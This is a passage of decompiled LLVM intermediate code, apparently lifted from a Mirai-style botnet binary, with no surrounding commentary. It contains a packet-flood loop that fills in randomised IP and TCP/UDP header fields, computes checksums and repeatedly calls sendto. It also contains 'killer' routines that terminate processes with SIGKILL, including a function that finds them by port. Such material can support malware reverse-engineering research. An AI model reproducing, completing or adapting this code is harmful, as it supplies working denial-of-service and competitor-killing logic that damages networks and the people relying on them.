  %v0_804d389 = load i32, i32* @edi, align 4
  store i32 %v0_804d389, i32* %stack_var_-2220, align 4
  %v2_804d38a = inttoptr i32 %v0_804d389 to i8*
  %v3_804d38a = call i32 @rand_alphastr(i8* %v2_804d38a, i32 %v0_804d386)
  %v0_804d38f = load i32, i32* @ebp, align 4
  %v1_804d38f = load i32, i32* @ebx, align 4
  %v2_804d38f = add i32 %v0_804d38f, 41
  %v3_804d38f = add i32 %v2_804d38f, %v1_804d38f
  %v4_804d38f = inttoptr i32 %v3_804d38f to i8*
  store i8 0, i8* %v4_804d38f, align 1
  %v0_804d394 = load i32, i32* @ebx, align 4
  %v1_804d394 = add i32 %v0_804d394, 10
  %v2_804d394 = inttoptr i32 %v1_804d394 to i16*
  store i16 0, i16* %v2_804d394, align 2
  %v2_804d39a = load i32, i32* %stack_var_-2220, align 4
  store i32 %v2_804d39a, i32* %eax.global-to-local, align 4
  store i32 %v0_804d388, i32* %edx.global-to-local, align 4
  %v0_804d39e = load i32, i32* @ebx, align 4
  store i32 %v0_804d39e, i32* %stack_var_-2220, align 4
  %v2_804d39f = inttoptr i32 %v0_804d39e to i16*
  %v3_804d39f = call i32 @checksum_generic(i16* %v2_804d39f, i32 20)
  %v4_804d39f = trunc i32 %v3_804d39f to i16
  store i32 %v3_804d39f, i32* %eax.global-to-local, align 4
  %v3_804d3a8 = load i32, i32* @ebx, align 4
  %v4_804d3a8 = add i32 %v3_804d3a8, 10
  %v5_804d3a8 = inttoptr i32 %v4_804d3a8 to i16*
  store i16 %v4_804d39f, i16* %v5_804d3a8, align 2
  %v0_804d3ac = load i32, i32* @esi, align 4
  %v1_804d3ac = add i32 %v0_804d3ac, 6
  %v2_804d3ac = inttoptr i32 %v1_804d3ac to i16*
  store i16 0, i16* %v2_804d3ac, align 2
  %v0_804d3b3 = load i32, i32* @esi, align 4
  %v1_804d3b3 = add i32 %v0_804d3b3, 4
  %v2_804d3b3 = inttoptr i32 %v1_804d3b3 to i16*
  %v3_804d3b3 = load i16, i16* %v2_804d3b3, align 2
  %v4_804d3b3 = zext i16 %v3_804d3b3 to i32
  store i32 %v4_804d3b3, i32* %eax.global-to-local, align 4
  %v0_804d3be = load i32, i32* @ebx, align 4
  %v4_804d3bf = inttoptr i32 %v0_804d3b3 to i16*
  %v5_804d3bf = call i32 @checksum_tcpudp(i32 %v0_804d3be, i16* %v4_804d3bf, i32 %v4_804d3b3)
  %v6_804d3bf = trunc i32 %v5_804d3bf to i16
  %v3_804d3c4 = load i32, i32* @esi, align 4
  %v4_804d3c4 = add i32 %v3_804d3c4, 6
  %v5_804d3c4 = inttoptr i32 %v4_804d3c4 to i16*
  store i16 %v6_804d3bf, i16* %v5_804d3c4, align 2
  %v3_804d3c8 = load i32, i32* %stack_var_-20, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  store i32 %stack_var_-2168.0, i32* %edx.global-to-local, align 4
  %v2_804d3e0 = mul i32 %v3_804d3c8, 24
  %v3_804d3e0 = add i32 %v2_804d3e0, %arg3
  store i32 %v3_804d3e0, i32* %eax.global-to-local, align 4
  %v2_804d3e3 = add i32 %v3_804d3e0, 4
  %v3_804d3e3 = inttoptr i32 %v2_804d3e3 to i32*
  store i32 %stack_var_-2168.0, i32* %v3_804d3e3, align 4
  %v0_804d3e6 = load i32, i32* @esi, align 4
  %v1_804d3e6 = add i32 %v0_804d3e6, 2
  %v2_804d3e6 = inttoptr i32 %v1_804d3e6 to i16*
  %v3_804d3e6 = load i16, i16* %v2_804d3e6, align 2
  %v4_804d3e6 = zext i16 %v3_804d3e6 to i32
  %v5_804d3e6 = load i32, i32* %edx.global-to-local, align 4
  %v6_804d3e6 = and i32 %v5_804d3e6, -65536
  %v7_804d3e6 = or i32 %v6_804d3e6, %v4_804d3e6
  store i32 %v7_804d3e6, i32* %edx.global-to-local, align 4
  %v2_804d3ea = load i32, i32* %eax.global-to-local, align 4
  %v3_804d3ea = add i32 %v2_804d3ea, 2
  %v4_804d3ea = inttoptr i32 %v3_804d3ea to i16*
  store i16 %v3_804d3e6, i16* %v4_804d3ea, align 2
  %v0_804d3f0 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804d3f0, i32* %stack_var_-2220, align 4
  store i32 %v1_804d350.pre-phi, i32* @esi, align 4
  %v0_804d3fb = load i32, i32* @ebx, align 4
  store i32 %v3_804d12a, i32* %ecx.global-to-local, align 4
  %v6_804d401 = call i32 @__libc_sendto(i32 %v3_804d12a, i32 %v0_804d3fb, i32 %v1_804d350.pre-phi, i32 16384, i32 %v0_804d3f0, i32 16)
  %v3_804d406 = load i32, i32* %stack_var_-20, align 4
  %v1_804d40d = add i32 %v3_804d406, 1
  store i32 %v1_804d40d, i32* %eax.global-to-local, align 4
  store i32 %v1_804d40d, i32* %stack_var_-20, align 4
  %v7_804d41c = icmp sgt i32 %v4_804cf0a, %v1_804d40d
  br i1 %v7_804d41c, label %dec_label_pc_804d422, label %dec_label_pc_804d4d7

dec_label_pc_804d422:                             ; preds = %dec_label_pc_804d386, %dec_label_pc_804d345
  %v0_804d43b = phi i32 [ %v1_804d40d, %dec_label_pc_804d386 ], [ 0, %dec_label_pc_804d345 ]
  store i32 %v3_804cf3d, i32* %edx.global-to-local, align 4
  %v2_804d42c = mul i32 %v0_804d43b, 4
  %v3_804d42c = add i32 %v2_804d42c, %v3_804cf3d
  %v4_804d42c = inttoptr i32 %v3_804d42c to i32*
  %v5_804d42c = load i32, i32* %v4_804d42c, align 4
  store i32 %v5_804d42c, i32* @ebx, align 4
  %v1_804d42f = add i32 %v5_804d42c, 20
  store i32 %v1_804d42f, i32* @esi, align 4
  %v1_804d432 = add i32 %v5_804d42c, 41
  store i32 %v1_804d432, i32* @edi, align 4
  br i1 %v1_804d435, label %dec_label_pc_804d362, label %dec_label_pc_804d43b

dec_label_pc_804d43b:                             ; preds = %dec_label_pc_804d422
  %v1_804d43b = call i32 @rand_next(i32 %v0_804d43b)
  %v2_804d43b = trunc i32 %v1_804d43b to i16
  store i32 %v1_804d43b, i32* %eax.global-to-local, align 4
  %v3_804d446 = load i32, i32* @ebx, align 4
  %v4_804d446 = add i32 %v3_804d446, 4
  %v5_804d446 = inttoptr i32 %v4_804d446 to i16*
  store i16 %v2_804d43b, i16* %v5_804d446, align 2
  br i1 %v1_804d44a, label %dec_label_pc_804d36e, label %dec_label_pc_804d43b.dec_label_pc_804d450_crit_edge

dec_label_pc_804d43b.dec_label_pc_804d450_crit_edge: ; preds = %dec_label_pc_804d43b
  %v0_804d450.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804d450

dec_label_pc_804d450:                             ; preds = %dec_label_pc_804d43b.dec_label_pc_804d450_crit_edge, %dec_label_pc_804d362
  %v0_804d450 = phi i32 [ %v0_804d450.pre, %dec_label_pc_804d43b.dec_label_pc_804d450_crit_edge ], [ %v0_804d43b, %dec_label_pc_804d362 ]
  %v1_804d450 = call i32 @rand_next(i32 %v0_804d450)
  %v2_804d450 = trunc i32 %v1_804d450 to i16
  store i32 %v1_804d450, i32* %eax.global-to-local, align 4
  %v3_804d45b = load i32, i32* @ebx, align 4
  %v4_804d45b = add i32 %v3_804d45b, 20
  %v5_804d45b = inttoptr i32 %v4_804d45b to i16*
  store i16 %v2_804d450, i16* %v5_804d45b, align 2
  br i1 %v1_804d45f, label %dec_label_pc_804d37a, label %dec_label_pc_804d465

dec_label_pc_804d465:                             ; preds = %dec_label_pc_804d450, %dec_label_pc_804d36e
  %v0_804d465 = load i32, i32* %stack_var_-20, align 4
  %v1_804d465 = call i32 @rand_next(i32 %v0_804d465)
  %v2_804d465 = trunc i32 %v1_804d465 to i16
  store i32 %v1_804d465, i32* %eax.global-to-local, align 4
  %v3_804d470 = load i32, i32* @esi, align 4
  %v4_804d470 = add i32 %v3_804d470, 2
  %v5_804d470 = inttoptr i32 %v4_804d470 to i16*
  store i16 %v2_804d465, i16* %v5_804d470, align 2
  br i1 %v1_804d474, label %dec_label_pc_804d386, label %dec_label_pc_804d480

dec_label_pc_804d480:                             ; preds = %dec_label_pc_804d465, %dec_label_pc_804d37a
  %v0_804d480 = load i32, i32* %stack_var_-20, align 4
  %v1_804d480 = call i32 @rand_next(i32 %v0_804d480)
  %v2_804d480 = trunc i32 %v1_804d480 to i16
  store i32 %v1_804d480, i32* %eax.global-to-local, align 4
  %v3_804d485 = load i32, i32* @ebx, align 4
  %v4_804d485 = add i32 %v3_804d485, 28
  %v5_804d485 = inttoptr i32 %v4_804d485 to i16*
  store i16 %v2_804d480, i16* %v5_804d485, align 2
  br label %dec_label_pc_804d386

dec_label_pc_804d48e:                             ; preds = %dec_label_pc_804d0b6, %dec_label_pc_804d0ae
  %v4_804d09020 = phi i32 [ %v1_804d0b6, %dec_label_pc_804d0b6 ], [ %v6_804d090, %dec_label_pc_804d0ae ]
  %v12_804d48e = icmp eq i32 %v1_804d088, %v0_804d0c1
  br i1 %v12_804d48e, label %dec_label_pc_804d0c1, label %dec_label_pc_804d496

dec_label_pc_804d496:                             ; preds = %dec_label_pc_804d48e, %dec_label_pc_804d0a1, %dec_label_pc_804d099
  %v4_804d09019 = phi i32 [ %v4_804d09020, %dec_label_pc_804d48e ], [ %v6_804d090, %dec_label_pc_804d099 ], [ %v6_804d090, %dec_label_pc_804d0a1 ]
  %stack_var_-2129.2 = phi i8 [ %stack_var_-2129.1, %dec_label_pc_804d48e ], [ %stack_var_-2129.0, %dec_label_pc_804d099 ], [ %stack_var_-2129.0, %dec_label_pc_804d0a1 ]
  %v1_804d496 = add i32 %v0_804d0c1, 1
  store i32 %v1_804d496, i32* @edx, align 4
  %v1_804d497 = add i32 %v0_804d497, 1
  store i32 %v1_804d497, i32* %ecx.global-to-local, align 4
  %v12_804d498 = icmp eq i32 %v1_804d496, %v0_804d073
  %v1_804d49a = icmp eq i1 %v12_804d498, false
  br i1 %v1_804d49a, label %dec_label_pc_804d090, label %dec_label_pc_804d4a0

dec_label_pc_804d4a0:                             ; preds = %dec_label_pc_804d496, %dec_label_pc_804d073, %dec_label_pc_804d018, %entry
  %v0_804d4a0 = load i32, i32* %stack_var_-20, align 4
  %v1_804d4a0 = call i32 @rand_next(i32 %v0_804d4a0)
  %v1_804d4a5 = urem i32 %v1_804d4a0, 4
  store i32 %v1_804d4a5, i32* %eax.global-to-local, align 4
  %v9_804d4a8 = icmp eq i32 %v1_804d4a5, 1
  br i1 %v9_804d4a8, label %dec_label_pc_804d0f2, label %dec_label_pc_804d4ad

dec_label_pc_804d4ad:                             ; preds = %dec_label_pc_804d4a0
  %v2_804d4a5 = icmp eq i32 %v1_804d4a5, 0
  %v1_804d4ad = icmp eq i1 %v2_804d4a5, false
  br i1 %v1_804d4ad, label %dec_label_pc_804d502, label %dec_label_pc_804d0f2

dec_label_pc_804d4bc:                             ; preds = %dec_label_pc_804d13d
  store i32 %v3_804d12a, i32* %ebx.global-to-local, align 4
  store i32 %v3_804d12a, i32* %stack_var_-2220, align 4
  %v1_804d4c4 = call i32 @__GI___libc_close(i32 %v3_804d12a)
  store i32 %v1_804d4c4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d4cc

dec_label_pc_804d4cc:                             ; preds = %dec_label_pc_804d114, %dec_label_pc_804d0f2, %dec_label_pc_804d4bc
  %v0_804d4d6 = phi i32 [ 0, %dec_label_pc_804d114 ], [ %v2_804d103, %dec_label_pc_804d0f2 ], [ %v1_804d4c4, %dec_label_pc_804d4bc ]
  store i32 %v0_804cf03, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d4d6

dec_label_pc_804d4d7:                             ; preds = %dec_label_pc_804d386, %dec_label_pc_804d32f.dec_label_pc_804d4d7_crit_edge
  store i32 0, i32* %stack_var_-2220, align 4
  %v2_804d4dc = call i32 @__GI_time(i32* null)
  store i32 %v2_804d4dc, i32* %eax.global-to-local, align 4
  %v5_804d4e8 = icmp slt i32 %v2_804d103, %v2_804d4dc
  br i1 %v5_804d4e8, label %dec_label_pc_804d4ee, label %dec_label_pc_804d32f

dec_label_pc_804d4ee:                             ; preds = %dec_label_pc_804d4d7
  store i32 %v0_804cf03, i32* %ebx.global-to-local, align 4
  ret i32 %v2_804d4dc

dec_label_pc_804d502:                             ; preds = %dec_label_pc_804d4ad
  %v9_804d502 = icmp eq i32 %v1_804d4a5, 2
  br i1 %v9_804d502, label %dec_label_pc_804d0f2, label %dec_label_pc_804d507

dec_label_pc_804d507:                             ; preds = %dec_label_pc_804d502
  %v9_804d507 = icmp eq i32 %v1_804d4a5, 3
  %v1_804d50a = icmp eq i1 %v9_804d507, false
  %. = select i1 %v1_804d50a, i32 %tmp69, i32 33686020
  br label %dec_label_pc_804d0f2

; uselistorder directives
  uselistorder i32 %v1_804d4a5, { 4, 3, 0, 2, 1 }
  uselistorder i32 %v1_804d497, { 1, 0 }
  uselistorder i32 %v1_804d496, { 0, 2, 1 }
  uselistorder i32 %v1_804d480, { 1, 0 }
  uselistorder i32 %v1_804d465, { 1, 0 }
  uselistorder i32 %v1_804d450, { 1, 0 }
  uselistorder i32 %v1_804d43b, { 1, 0 }
  uselistorder i32 %v0_804d43b, { 1, 2, 0 }
  uselistorder i32 %v1_804d40d, { 1, 0, 2, 3 }
  uselistorder i1 %v13_804d455, { 1, 0 }
  uselistorder i32 %v1_804d350.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_804d2e2, { 1, 2, 0 }
  uselistorder i32 %v2_804d2df, { 0, 2, 1 }
  uselistorder i32 %v1_804d2df, { 1, 0 }
  uselistorder i32 %v0_804d2d0, { 1, 0 }
  uselistorder i32 %v0_804d4f9, { 1, 0, 2 }
  uselistorder i32 %v0_804d21a, { 1, 0, 2 }
  uselistorder i32 %v1_804d1d9, { 0, 2, 1 }
  uselistorder i32 %.pre44, { 1, 2, 3, 0, 4 }
  uselistorder i32 %.pre, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v4_804d192, { 1, 0 }
  uselistorder i32 %v4_804d175, { 1, 0 }
  uselistorder i32 %v4_804d171, { 1, 0 }
  uselistorder i32 %v3_804d12a, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804d118, { 0, 4, 5, 3, 2, 1, 6 }
  uselistorder i32 %v2_804d103, { 1, 0, 2 }
  uselistorder i32 %stack_var_-2168.0, { 0, 2, 1 }
  uselistorder i32 %v2_804d0ce, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804d0b6, { 0, 2, 1 }
  uselistorder i32 %v6_804d090, { 2, 3, 1, 0, 4 }
  uselistorder i8 %stack_var_-2129.0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804d0c1, { 2, 1, 0 }
  uselistorder i32 %v1_804d088, { 1, 0, 2 }
  uselistorder i32 %v2_804d081, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d06a, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 %v2_804d01e, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 %v0_804d010, { 1, 0, 2 }
  uselistorder i32 %v3_804cff0, { 1, 0, 2 }
  uselistorder i32 %v5_804cfd9, { 0, 1, 4, 5, 3, 2, 6 }
  uselistorder i32 %v5_804cfca, { 1, 0, 2 }
  uselistorder i32 %v5_804cf82, { 1, 0 }
  uselistorder i32 %v5_804cf70, { 1, 0, 2 }
  uselistorder i32 %v5_804cf4c, { 0, 2, 1 }
  uselistorder i32 %v3_804cf3d, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v4_804cf0a, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804cf03, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 3, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 5, 1, 2, 3, 4, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 20, 16, 17, 18, 19, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i16 -1, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 18, 17, 19, 20, 22, 21, 23, 24, 25, 26, 29, 28, 27, 30, 31, 32 }
  uselistorder i8 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d4cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d386, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d2eb, { 1, 0 }
  uselistorder label %dec_label_pc_804d2d6, { 1, 0 }
  uselistorder label %dec_label_pc_804d24b, { 1, 0 }
  uselistorder label %dec_label_pc_804d0f2, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804d0ae, { 1, 0 }
}

define i32 @checksum_generic(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804d547 = ptrtoint i16* %arg1 to i32
  %tmp14 = or i32 %arg2, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804d565, label %dec_label_pc_804d550

dec_label_pc_804d550:                             ; preds = %entry, %dec_label_pc_804d550
  %v0_804d55e = phi i32 [ %v2_804d55e, %dec_label_pc_804d550 ], [ 0, %entry ]
  %v0_804d553 = phi i32 [ %v1_804d553, %dec_label_pc_804d550 ], [ %arg2, %entry ]
  %v0_804d55b = phi i32 [ %v1_804d55b, %dec_label_pc_804d550 ], [ %v4_804d547, %entry ]
  %v1_804d550 = inttoptr i32 %v0_804d55b to i16*
  %v2_804d550 = load i16, i16* %v1_804d550, align 2
  %v3_804d550 = zext i16 %v2_804d550 to i32
  %v1_804d553 = add i32 %v0_804d553, -2
  %v1_804d55b = add i32 %v0_804d55b, 2
  %v2_804d55e = add i32 %v3_804d550, %v0_804d55e
  %v5_804d560 = icmp eq i32 %v1_804d553, 0
  %v9_804d560 = icmp eq i32 %v0_804d553, 3
  %v2_804d563 = or i1 %v9_804d560, %v5_804d560
  br i1 %v2_804d563, label %dec_label_pc_804d565.loopexit, label %dec_label_pc_804d550

dec_label_pc_804d565.loopexit:                    ; preds = %dec_label_pc_804d550
  br label %dec_label_pc_804d565

dec_label_pc_804d565:                             ; preds = %dec_label_pc_804d565.loopexit, %entry
  %v0_804d56b = phi i32 [ %v2_804d55e, %dec_label_pc_804d565.loopexit ], [ 0, %entry ]
  %v0_804d568 = phi i32 [ %v1_804d55b, %dec_label_pc_804d565.loopexit ], [ %v4_804d547, %entry ]
  %v0_804d565 = phi i32 [ %v1_804d553, %dec_label_pc_804d565.loopexit ], [ %arg2, %entry ]
  %v8_804d565 = icmp eq i32 %v0_804d565, 1
  %v1_804d566 = icmp eq i1 %v8_804d565, false
  br i1 %v1_804d566, label %dec_label_pc_804d56d, label %dec_label_pc_804d568

dec_label_pc_804d568:                             ; preds = %dec_label_pc_804d565
  %v1_804d568 = inttoptr i32 %v0_804d568 to i8*
  %v2_804d568 = load i8, i8* %v1_804d568, align 1
  %v3_804d568 = sext i8 %v2_804d568 to i32
  %v2_804d56b = add i32 %v3_804d568, %v0_804d56b
  br label %dec_label_pc_804d56d

dec_label_pc_804d56d:                             ; preds = %dec_label_pc_804d565, %dec_label_pc_804d568
  %v0_804d56d = phi i32 [ %v0_804d56b, %dec_label_pc_804d565 ], [ %v2_804d56b, %dec_label_pc_804d568 ]
  %v1_804d56d = urem i32 %v0_804d56d, 65536
  %v2_804d570 = udiv i32 %v0_804d56d, 65536
  %v2_804d573 = add nuw nsw i32 %v1_804d56d, %v2_804d570
  %v2_804d578 = udiv i32 %v2_804d573, 65536
  %v2_804d57b = add nuw nsw i32 %v2_804d578, %v2_804d573
  %v1_804d57d = urem i32 %v2_804d57b, 65536
  %v1_804d580 = xor i32 %v1_804d57d, 65535
  ret i32 %v1_804d580

; uselistorder directives
  uselistorder i32 %v2_804d573, { 1, 0 }
  uselistorder i32 %v0_804d56b, { 1, 0 }
  uselistorder i32 %v1_804d553, { 0, 2, 1 }
  uselistorder i32 %v4_804d547, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d56d, { 1, 0 }
  uselistorder label %dec_label_pc_804d550, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i16* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %v4_804d5a5 = ptrtoint i16* %arg2 to i32
  %v1_804d5ae = add i32 %arg1, 12
  %v2_804d5ae = inttoptr i32 %v1_804d5ae to i32*
  %v3_804d5ae = load i32, i32* %v2_804d5ae, align 4
  %v1_804d5b1 = add i32 %arg1, 16
  %v2_804d5b1 = inttoptr i32 %v1_804d5b1 to i32*
  %v3_804d5b1 = load i32, i32* %v2_804d5b1, align 4
  %v7_804d5b7 = icmp sgt i32 %tmp15, 1
  br i1 %v7_804d5b7, label %dec_label_pc_804d5c0, label %dec_label_pc_804d5d5

dec_label_pc_804d5c0:                             ; preds = %entry, %dec_label_pc_804d5c0
  %v0_804d5ce = phi i32 [ %v2_804d5ce, %dec_label_pc_804d5c0 ], [ 0, %entry ]
  %v0_804d5c3 = phi i32 [ %v1_804d5c3, %dec_label_pc_804d5c0 ], [ %tmp15, %entry ]
  %v0_804d5cb = phi i32 [ %v1_804d5cb, %dec_label_pc_804d5c0 ], [ %v4_804d5a5, %entry ]
  %v1_804d5c0 = inttoptr i32 %v0_804d5cb to i16*
  %v2_804d5c0 = load i16, i16* %v1_804d5c0, align 2
  %v3_804d5c0 = zext i16 %v2_804d5c0 to i32
  %v1_804d5c3 = add i32 %v0_804d5c3, -2
  %v1_804d5cb = add i32 %v0_804d5cb, 2
  %v2_804d5ce = add i32 %v3_804d5c0, %v0_804d5ce
  %v1_804d5d0 = add i32 %v0_804d5c3, -3
  %v6_804d5d0 = sub i32 2, %v0_804d5c3
  %v7_804d5d0 = and i32 %v1_804d5c3, %v6_804d5d0
  %v8_804d5d0 = icmp slt i32 %v7_804d5d0, 0
  %v9_804d5d0 = icmp eq i32 %v1_804d5d0, 0
  %v10_804d5d0 = icmp slt i32 %v1_804d5d0, 0
  %v3_804d5d3 = icmp eq i1 %v10_804d5d0, %v8_804d5d0
  %v4_804d5d3 = icmp eq i1 %v9_804d5d0, false
  %v5_804d5d3 = and i1 %v4_804d5d3, %v3_804d5d3
  br i1 %v5_804d5d3, label %dec_label_pc_804d5c0, label %dec_label_pc_804d5d5.loopexit

dec_label_pc_804d5d5.loopexit:                    ; preds = %dec_label_pc_804d5c0
  br label %dec_label_pc_804d5d5

dec_label_pc_804d5d5:                             ; preds = %dec_label_pc_804d5d5.loopexit, %entry
  %v0_804d635 = phi i32 [ %v2_804d5ce, %dec_label_pc_804d5d5.loopexit ], [ 0, %entry ]
  %v0_804d633 = phi i32 [ %v1_804d5cb, %dec_label_pc_804d5d5.loopexit ], [ %v4_804d5a5, %entry ]
  %v0_804d5d5 = phi i32 [ %v1_804d5c3, %dec_label_pc_804d5d5.loopexit ], [ %tmp15, %entry ]
  %v8_804d5d5 = icmp eq i32 %v0_804d5d5, 1
  br i1 %v8_804d5d5, label %dec_label_pc_804d631, label %dec_label_pc_804d5d8

dec_label_pc_804d5d8:                             ; preds = %dec_label_pc_804d5d5, %dec_label_pc_804d631
  %v1_804d604 = phi i32 [ %v0_804d635, %dec_label_pc_804d5d5 ], [ %v2_804d635, %dec_label_pc_804d631 ]
  %v1_804d5dc = urem i32 %v3_804d5ae, 65536
  %v1_804d5df = urem i32 %v3_804d5b1, 65536
  %v1_804d5e4 = add i32 %arg1, 9
  %v2_804d5e4 = inttoptr i32 %v1_804d5e4 to i8*
  %v3_804d5e4 = load i8, i8* %v2_804d5e4, align 1
  %v2_804d5e7 = udiv i32 %v3_804d5ae, 65536
  %v4_804d5ee = urem i32 %arg3, 65536
  %v2_804d5f3 = udiv i32 %v3_804d5b1, 65536
  %v1_804d600 = zext i8 %v3_804d5e4 to i16
  %v2_804d600 = call i16 @llvm.bswap.i16(i16 %v1_804d600)
  %v3_804d600 = zext i16 %v2_804d600 to i32
  %v2_804d5ea = add nuw nsw i32 %v1_804d5dc, %v4_804d5ee
  %v2_804d5ec = add nuw nsw i32 %v2_804d5ea, %v2_804d5e7
  %v2_804d5fc = add nuw nsw i32 %v2_804d5ec, %v1_804d5df
  %v2_804d5fe = add nuw nsw i32 %v2_804d5fc, %v2_804d5f3
  %v2_804d604 = add i32 %v2_804d5fe, %v1_804d604
  %v2_804d60c = add i32 %v2_804d604, %v3_804d600
  %tmp = icmp ult i32 %v2_804d60c, 65536
  br i1 %tmp, label %dec_label_pc_804d623, label %dec_label_pc_804d615

dec_label_pc_804d615:                             ; preds = %dec_label_pc_804d5d8, %dec_label_pc_804d615
  %v2_804d61a2 = phi i32 [ %v2_804d61a, %dec_label_pc_804d615 ], [ %v2_804d60c, %dec_label_pc_804d5d8 ]
  %v2_804d61e3.in = phi i32 [ %v2_804d61a, %dec_label_pc_804d615 ], [ %v2_804d60c, %dec_label_pc_804d5d8 ]
  %v2_804d61e3 = udiv i32 %v2_804d61e3.in, 65536
  %v1_804d615 = urem i32 %v2_804d61a2, 65536
  %v2_804d61a = add nuw nsw i32 %v1_804d615, %v2_804d61e3
  %tmp25 = icmp ult i32 %v2_804d61a, 65536
  %v1_804d621 = icmp eq i1 %tmp25, false
  br i1 %v1_804d621, label %dec_label_pc_804d615, label %dec_label_pc_804d623.loopexit

dec_label_pc_804d623.loopexit:                    ; preds = %dec_label_pc_804d615
  br label %dec_label_pc_804d623

dec_label_pc_804d623:                             ; preds = %dec_label_pc_804d623.loopexit, %dec_label_pc_804d5d8
  %v0_804d623 = phi i32 [ %v2_804d61a, %dec_label_pc_804d623.loopexit ], [ %v2_804d60c, %dec_label_pc_804d5d8 ]
  %v1_804d623 = urem i32 %v0_804d623, 65536
  %v1_804d627 = xor i32 %v1_804d623, 65535
  ret i32 %v1_804d627

dec_label_pc_804d631:                             ; preds = %dec_label_pc_804d5d5
  %v1_804d633 = inttoptr i32 %v0_804d633 to i8*
  %v2_804d633 = load i8, i8* %v1_804d633, align 1
  %v3_804d633 = zext i8 %v2_804d633 to i32
  %v2_804d635 = add i32 %v3_804d633, %v0_804d635
  br label %dec_label_pc_804d5d8

; uselistorder directives
  uselistorder i32 %v2_804d61a, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804d60c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804d5d0, { 1, 0 }
  uselistorder i32 %v1_804d5c3, { 0, 2, 1 }
  uselistorder i32 %v4_804d5a5, { 1, 0 }
  uselistorder i32 %tmp15, { 1, 0, 2 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d615, { 1, 0 }
  uselistorder label %dec_label_pc_804d5d8, { 1, 0 }
  uselistorder label %dec_label_pc_804d5c0, { 1, 0 }
}

define i32 @killer_kill() local_unnamed_addr {
entry:
  %v0_804d643 = load i32, i32* @global_var_8057d24.28, align 4
  %v2_804d64b = call i32 @kill(i32 %v0_804d643, i32 9)
  ret i32 %v2_804d64b
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp48 = call i8 @__decompiler_undefined_function_1()
  %tmp52 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8796 = alloca i32, align 4
  %stack_var_-561 = alloca i8, align 1
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d660 = load i32, i32* @ebp, align 4
  %v0_804d661 = load i32, i32* @edi, align 4
  %v0_804d662 = load i32, i32* @esi, align 4
  %v0_804d663 = load i32, i32* @ebx, align 4
  store i32 %v0_804d663, i32* %stack_var_-16, align 4
  %v15_804d664 = ptrtoint i32* %stack_var_-8780 to i32
  %v2_804d66a = ptrtoint i8* %stack_var_-561 to i32
  store i32 %v2_804d66a, i32* @edi, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 %v2_804d66a, i32* %stack_var_-8796, align 4
  %v4_804d6ad = call i32 @__GI_memset(i8* nonnull %stack_var_-561, i32 0, i32 513)
  %v1_804d6b5 = trunc i32 %arg1 to i16
  %v2_804d6b5 = call i16 @llvm.bswap.i16(i16 %v1_804d6b5)
  %v3_804d6b5 = zext i16 %v2_804d6b5 to i32
  %v2_804d6c0 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_804d6c0, i32* %eax.global-to-local, align 4
  store i32 %v3_804d6b5, i32* @ebx, align 4
  store i32 %v2_804d6c0, i32* %stack_var_-8796, align 4
  %v3_804d6cb = bitcast i32* %stack_var_-8753 to i8*
  %v4_804d6cb = call i32 @__GI_memset(i8* %v3_804d6cb, i32 0, i32 4096)
  store i32 %v4_804d6cb, i32* %eax.global-to-local, align 4
  %v2_804d6da = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_804d6da, i32* %stack_var_-8796, align 4
  %v3_804d6e2 = bitcast i32* %stack_var_-4657 to i8*
  %v4_804d6e2 = call i32 @__GI_memset(i8* %v3_804d6e2, i32 0, i32 4096)
  %v2_804d6ea = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_804d6ea, i32* %eax.global-to-local, align 4
